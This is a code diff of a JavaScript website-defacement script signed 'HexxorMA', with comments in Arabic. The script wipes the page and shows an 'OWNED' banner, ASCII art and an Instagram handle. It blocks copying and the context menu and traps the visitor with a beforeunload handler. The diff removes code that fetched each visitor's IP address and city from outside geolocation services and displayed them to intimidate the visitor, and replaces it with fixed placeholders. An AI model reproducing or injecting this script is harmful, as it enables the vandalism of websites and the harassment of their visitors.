@@ -1,10 +1,21 @@
 (function() {
+  // ================== إعدادات ==================
   const HACKER_NAME = "HexxorMA";
   const GREETING = "welcome";
   const MOCK_LINE = "> u seek all other";
   const OWNED_LINE = "YOUR WEBSITE OWNED BY HEXXORMA";
   const INSTAGRAM = "insta:flamingoxx4";
-  
+
+  // ================== معلومات ثابتة (مش محتاجة API) ==================
+  const VISITOR_INFO = {
+    ip: "Hidden",
+    city: "Unknown",
+    region: "Unknown",
+    country: "Unknown",
+    hostname: window.location.hostname || "Unknown"
+  };
+
+  // ================== ASCII ART ==================
   const ASCII_ART = String.raw`
                     .""--..__
  _                     []       \`\`-.._
@@ -43,8 +54,9 @@
 \`-.___,-.      .-.        ___,'        (/    
 \`---'\`   \`'----'`;
 
+  // ================== CSS ==================
   const style = document.createElement('style');
-  style.innerHTML = \`
+  style.innerHTML = `
     * { margin: 0; padding: 0; box-sizing: border-box; }
     html, body { background: #000 !important; color: #0f0 !important; font-family: 'Courier New', monospace !important; overflow-x: hidden !important; min-height: 100vh !important; }
     .vk-container { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #000; padding: 20px; z-index: 999999999; overflow-y: auto; font-family: 'Courier New', monospace; }
@@ -69,45 +81,26 @@
       .vk-owned { font-size: 3.5vw; }
       .vk-insta { font-size: 3vw; }
     }
-  \`;
+  `;
   document.head.appendChild(style);
 
-  function getVisitorInfo() {
-    return new Promise((resolve) => {
-      const fallback = { ip: "Hidden", city: "Unknown", region: "Unknown", country: "Unknown", hostname: window.location.hostname || "Unknown" };
-      const timeout = setTimeout(() => resolve(fallback), 5000);
-      fetch('https://api.ipify.org?format=json')
-        .then(r => r.json())
-        .then(data => {
-          const ip = data.ip;
-          fetch(\`https://ipapi.co/\${ip}/json/\`)
-            .then(r => r.json())
-            .then(geo => {
-              clearTimeout(timeout);
-              resolve({ ip: ip, city: geo.city || "Unknown", region: geo.region || "Unknown", country: geo.country_name || "Unknown", hostname: window.location.hostname || "Unknown" });
-            })
-            .catch(() => { clearTimeout(timeout); resolve({ ...fallback, ip: ip }); });
-        })
-        .catch(() => { clearTimeout(timeout); resolve(fallback); });
-    });
-  }
-
-  async function buildPage() {
-    const info = await getVisitorInfo();
+  // ================== بناء الصفحة ==================
+  function buildPage() {
+    const info = VISITOR_INFO;
     const container = document.createElement('div');
     container.className = 'vk-container';
-    container.innerHTML = \`
-      <div class="vk-greeting">\${GREETING} \${info.hostname}!</div>
-      <div class="vk-mock">\${MOCK_LINE}</div>
-      <pre class="vk-ascii">\${ASCII_ART}</pre>
+    container.innerHTML = `
+      <div class="vk-greeting">${GREETING} ${info.hostname}!</div>
+      <div class="vk-mock">${MOCK_LINE}</div>
+      <pre class="vk-ascii">${ASCII_ART}</pre>
       <div class="vk-info">
         <div class="vk-info-title">YOUR INFO:</div>
-        <div class="vk-info-line">USER: <span class="vk-info-value">\${info.hostname}</span></div>
-        <div class="vk-info-line">LOCATED IN: <span class="vk-info-value">\${info.city}, \${info.region}, \${info.ip}</span></div>
+        <div class="vk-info-line">USER: <span class="vk-info-value">${info.hostname}</span></div>
+        <div class="vk-info-line">LOCATED IN: <span class="vk-info-value">${info.city}, ${info.region}, ${info.ip}</span></div>
       </div>
-      <div class="vk-owned">\${OWNED_LINE}</div>
-      <div class="vk-insta">\${INSTAGRAM}</div>
-    \`;
+      <div class="vk-owned">${OWNED_LINE}</div>
+      <div class="vk-insta">${INSTAGRAM}</div>
+    `;
     document.body.innerHTML = '';
     document.body.appendChild(container);
   }
@@ -117,7 +110,6 @@
 
   document.addEventListener('copy', e => e.preventDefault());
   document.addEventListener('contextmenu', e => e.preventDefault());
-
   window.addEventListener('beforeunload', function(e) {
     e.preventDefault();
     e.returnValue = '';
